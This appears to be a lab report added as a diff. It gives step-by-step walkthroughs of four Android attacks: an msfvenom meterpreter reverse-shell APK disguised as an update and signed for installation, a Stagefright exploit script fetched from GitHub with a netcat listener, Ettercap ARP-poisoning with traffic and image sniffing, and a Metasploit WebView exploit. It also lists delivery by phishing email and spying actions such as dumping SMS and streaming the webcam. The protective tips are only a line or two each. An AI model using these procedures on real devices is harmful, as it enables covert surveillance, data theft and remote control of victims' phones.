@@ -1,0 +1,173 @@
+ATTACKS ON ANDROID
+ATTACK 1: MSFVENOM INJECTION
+Description of attack
+MSFVenom attack has been present in the android world since the initiation of android. The objective of this attack is to gain access to an android device and take control of it through a backdoor. Attacker can gain access to contact list, SMS’s, webcam access, device location, shell access and many others.
+Steps developed
+1.	Start Kali, open terminal and Write command “ifconfig” to show the IP address of the virtual machine
+2.	Use the following command to create apk:
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.16.135 LPORT=4444 R > /root/update.apk
+Creates update.apk. The size of the payload should be greater than zero. In our case it is 8811 bytes
+The apk file will appear in the root location as specified before. The file is empty at this moment.
+Signing apk file use commands:
+>keytool -genkey -v -keystore my-release-key.Keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+Jarsigner (to sign the apk)
+> jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore update.apk alias_name
+And then enter the keystore password: 123456. This signs the apk file using the keystore created before.
+>jarsigner -verify -verbose -certs update.apk (verifies apk)
+ 
+Using zipalign (to align the apk)
+>apt -get install zipalign
+> zipalign -v 4 update.apk update_v_1.apk
+Verification is successful, and the file appears like some genuine update file. apk is generated.
+3.	Starting a listener on the host machine
+To open Metasploit use Command > msfconsole
+Now start the exploit multi/handler by using Command > use exploit/multi/handler    
+Now we need to set the payload and other settings of the exploit.
+ 
+Now write command> exploit
+This starts the listener on the host machine to listen to the android device. Now transfer and install the apk file to the victim’s phone by e-mail. In a real scenario, the delivery of the malicious file can be achieved by social engineering attacks, tampering the device or any other methods to transfer a file and proceed with its execution. Meterpreter sessions opens when victim interacts with apk.
+ 
+Switch to meterpreter > shell using command: sessions -i 1
+This interacts with session 1 that is opened and the meterpreter shell appears    
+This shell appears, and our attack is successful. Now we can use the following attacks on the victim using this backdoor.
+•	Dump_contacts: to gain contacts
+•	Dump_sms: to gain SMSs
+•	Dump_callog: to gain call logs
+•	Check_root: to check if the device is rooted
+•	Geolocate: to find the device location
+•	Shell: to access the device shell
+•	Sysinfo: to get various information regarding the victim’s device
+•	Ps: to list all processes on victim’s device
+•	record_mic: to record mic 
+•	webcam_snap: to take a snap with the camera
+•	webcam_stream: to stream live cam of the victim
+1.1	Steps To Protect Against the Attack
+1.	Check app permissions and don’t install applications from untrusted sources. 
+2.	Keep OS updated.
+1.2.	Challenges Faced While Performing the Attack
+1.	Challenge: Transfer the malicious file to victim device. 
+•	Solution: Transferring the file to the target device was done by sending an email.  
+
+2.	Challenge: APK installation failed because it was not trusted - An APK needs to be signed in order to be installed on Android devices. The OS must trust the APK and validation must be achieved. 
+•	Solution: Signing the application (apk file) must be done by using a keytool to create a keystore, then jarsigner to sign the APK and finally zipalign to align the APK.
+
+3.	Challenge: Connectivity failed between virtual machines - Virtual Machine’s IP address was changing according to the WiFi network where they were connected. This is because the network adapter was using NAT and using the host ip address
+•	Solution: Validation of the current IP address while performing the attack if the physical location has changed.
+
+4.	Challenge: Could not reach metrerpreter > shell on the listener
+•	Solution: Searched online and found that the meterpreter > automatic shell initiation has been disabled and we need to use the “session” command to start using the meterpreter > shell.
+
+ATTACK 2: STAGEFRIGHT ATTACK
+
+Description of attack
+Stagefright attack has acted as a nightmare for android users since its initiation which included exploiting a loophole in the android operating system default MMS module. This attack is achieved by taking advantage of automatic download of MMS messages in the phone. Certain old versions of Android had a lack of validation of the content allowing to download media files. This ease the attacker to install any malicious script and gain access to the backdoor to the victim’s device.
+Steps developed
+1.	Open a terminal prompt and write “ifconfig” to show and validate the IP address of VM
+2.	Download the malicious python script from https://raw.githubusercontent.com/jduck/cve-2015-1538-1/master/Stagefright_CVE-2015-1538-1_Exploit.py
+3.	Save the script as mp4.py and run the command > python /root/Desktop/mp4.py
+ 
+4.	Run the command: python /root/Desktop -c 192.168.16.135 -p 4444 -o trendyvideo
+trendyvideo: name assigned to the malicious media file to be created
+ 
+Media file is created
+5.	Send the “trendyvideo.mp4” malicious file created to victim. After the file is downloaded in victim’s device and the victim is infected, use the below command to listen the backdoor connection.
+netcat -l -p 4444    
+Status: All the media explorers stop working as soon as the victim interacts with the malicious file. 
+There was no response after netcat -l -p 4444 step performed. 
+Conclusion: This attack was not successful
+Reason: Expected update of android policies
+AFTER RE-TRYING THE ATTACK SEVERAL TIMES
+Conclusion: Tried doing this attack again but still faced the same problem. Maybe the certain android policies update has rendered this attack useless anymore. So, without wasting more time, we decided to move on to the next attack.
+2.1	Challenges Faced While Performing the Attack
+1.	Challenge: No response after the netcat command 
+•	Solution: In process of resolution.
+
+2.	Challenge: Existing python script did not work 
+•	Solution: None. Attack failed 
+
+ATTACK 3: ETTERCAP- MITM/SNIFFING/TRAFFIC ANALYSIS and much more using ARP POISONING
+
+Description of attack
+ARP in ARP poisoning stands for Address Resolution Protocol. It is a process outsmarting the switch or router in a network by making your MAC address look like their intended MAC address. This helps the attacker to obtain the traffic that is supposed to be redirected towards the victim’s device. ETTERCAP is a tool to automate the process of ARP poisoning using Linux.
+Steps developed
+1.	Open a root terminal in KALI Linux
+2.	Type ifconfig to get the host machine’s IP address
+3.	Install ETTERCAP tool using the following command: apt-get install Ettercap
+4.	Write command: ettercap -G
+This starts the ETTERCAP using GUI : ‘G’ i.e ‘Graphical’
+5.	Ettercap opens
+6.	Go to Sniff\Unified sniffing
+ 
+7.	Check the wireless adapter and click OK
+ 
+Result of step 9: Unified snipping started
+8.	Go to Hosts\Scan for hosts
+Result of step 10: All hosts scanned on the network
+ 
+9.	Go to Targets\Select target(s)
+
+ 
+Here write Target 1 address as the routers IP address and Target 2 address as the Victim’s IP address and press OK.
+10.	Go to Mitm\ARP poisoning
+Then Tick Sniff remote connection and press OK
+ 
+Thus, ARP poisoning is started on the Victim’s traffic.
+11.	Now wait for the Victim to access the internet. The attacker machine will start sniffing all the web traffic.
+Attack procedure is done.
+STEPS TO ANALYSE THE OBTAINED TRAFFIC
+1.	Open application WIRESHARK pre-installed in Kali Linux
+2.	Double click on eth0
+ 
+It will start capturing all the Victim’s web traffic which can be analysed.
+3.	Go to ‘Statistics\ Resolved addresses’ to check the websites visited by the Victim and analysed and resolved by WIRESHARK.
+There are many more options that can be explored using WIRESHARK.
+Example: 
+•	Credentials sniffing over unencrypted traffic
+•	Using SSL Strip to Hijack an unencrypted HTTP session
+ 
+STEPS TO ANALYSE UNENCRYPTED IMAGE TRAFFIC
+1.	Open a new root terminal and write command: driftnet -i eth0
+This opens the driftnet window which is used for image traffic sniffing. 
+ 
+2.	As soon as the Victim browse unencrypted images on the web, all the traffic will be redirected towards the driftnet terminal. 
+All the live images viewed by the victim will be visible to the attacker
+ 
+The images being viewed by the victim can now be seen by the attacker using driftnet.  Attacker can also save the images locally.
+Thus, the attack was successfully implemented. 
+
+3.1	Steps To Protect From This Attack for a User
+1.	Always browse in HTTPS to protect the contents (destination is still unprotected)
+2.	Using TOR with HTTPS will protect against both contents sniffing and destination sniffing
+
+ATTACK 4: WEBVIEW EXPLOIT ATTACK
+In this attack, the attacker targets the default browser of the android to gain access to the device. The attacker creates an infected URL, which when accessed by the victim on the browser returns a failed page to the victim but creates a reverse backdoor to the attacker’s local machine. Using the android browser payload, and the meterpreter session is then created after successful reverse connection listening occurs. 
+IP address identification and connectivity tests:
+Android virtual machine:
+ 
+Kali Linux virtual machine:
+ 
+Type msfconsole in the terminal to initialise the Metasploit tool
+Enable exploit to use: Webview
+ 
+Configuring the exploit:
+ 
+Write command: exploit
+ 
+Victim should access to the malicious website. This URL can be send to the victim using social engineering, or phishing.
+http://192.168.16.135:8080
+Once the victim clicks the URL, reverse connection will be established.
+New sessions will be shown in Kali Linux:
+ 
+New attempt to access the malicious URL:
+ 
+Accessing the session created:
+ 
+Android commands can be run remotely through meterpreter module:
+ 
+At this point, we have remote access to the victim device. It is possible to get all the information such as system configuration, contacts, SMS, location, camera, pictures, among others.
+4.1	Challenges Faced While Performing the Attack
+1.	Challenge: Transfer the infected URL to victim device. 
+•	Solution: Transferring the URL to the target device was done by sending a fraudulent email.  
+2.	Challenge: Could not reach meterpreter > shell on the listener
+•	Took a lot of attempts but finally attained.
+
